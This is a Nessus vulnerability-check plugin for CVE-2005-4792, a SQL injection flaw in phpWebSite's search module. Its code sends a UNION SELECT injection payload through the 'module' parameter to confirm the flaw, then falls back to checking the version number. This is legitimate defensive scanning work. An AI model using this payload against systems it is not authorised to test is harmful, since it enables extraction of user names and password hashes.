#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to SQL
injection attacks. 

Description :

The remote host is running a version of phpWebSite that fails to
sanitize user-supplied input to the 'module' parameter of the 'search'
module before using it in database queries.  An attacker may be able to
exploit this issue to obtain sensitive information such as user names
and password hashes or to launch attacks against the database. 

See also : 

http://sourceforge.net/mailarchive/forum.php?thread_id=8540340&forum_id=34704
http://lists.grok.org.uk/pipermail/full-disclosure/2005-October/037936.html
http://www.phpwebsite.appstate.edu/index.php?module=announce&ANN_user_op=view&ANN_id=1034

Solution : 

Apply the security patch referenced in the vendor's advisory or upgrade
to phpWebSite 0.10.2 or later. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20011);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-4792");
  script_bugtraq_id(15088);

  script_name(english:"phpWebSite Search Module SQL Injection Vulnerability");
  script_summary(english:"Detects search module SQL injection vulnerability in phpWebSite");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("phpwebsite_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpwebsite"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Try to exploit the flaw.
  req = http_get(
    item:string(
      dir, "/index.php?",
      "module=", urlencode(str:string("' UNION SELECT 1,'", SCRIPT_NAME, "'/*"))
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we see our script name in the search block title.
  if (egrep(pattern:string('^ +<td class=".+"><b>.+ ', SCRIPT_NAME, "</b></td>"), string:res)) {
    security_warning(port);
    exit(0);
  }

  # The exploit requires that PHP's 'magic_quotes_gpc' setting be disabled
  # so check the version number as long as report paranoia is paranoid.
  if (ver =~ "^0\.([0-9]\.|10\.[01]$)" && report_paranoia > 1) {
    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Nessus has determined the vulnerability exists on the remote\n",
      "host simply by looking at the version number of phpWebSite\n",
      "installed there.\n"
    );
    security_warning(port:port, data:report);
    exit(0);
  }
}
